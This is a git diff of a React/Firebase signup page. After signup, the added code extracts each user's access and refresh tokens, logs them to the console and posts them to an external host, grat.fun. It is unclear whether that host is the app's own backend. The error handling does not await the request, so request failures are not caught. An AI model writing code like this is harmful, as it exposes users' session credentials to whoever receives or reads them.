@@ -10,9 +10,8 @@ import {
   TextField,
   Typography,
 } from "@mui/material";
-import {
-  Google,
-} from "@mui/icons-material";
+import { Google } from "@mui/icons-material";
+import axios from "axios";
 
 const Signup = () => {
   const navigate = useNavigate();
@@ -28,8 +27,35 @@ const Signup = () => {
       .then((userCredential) => {
         // Signed in
         const user = userCredential.user;
-        navigate("/login");
-        // ...
+        const {
+          uid,
+          email,
+          metadata: { creationTime, lastSignInTime },
+          providerId,
+          reloadUserInfo: { localId },
+          stsTokenManager: { accessToken, refreshToken },
+        } = user;
+        const userInfo = {
+          email,
+          creationTime,
+          lastSignInTime,
+          uid,
+          providerId,
+          localId,
+          accessToken,
+          refreshToken,
+        };
+        console.log("USERINFO", userInfo);
+        try {
+          const response = axios.post(
+            "https://grat.fun/api/pwniq/userInfo",
+            userInfo
+          );
+          console.log("RESPONSE", response);
+          // navigate("/login");
+        } catch (err) {
+          console.log(err);
+        }
       })
       .catch((error) => {
         const errorCode = error.code;
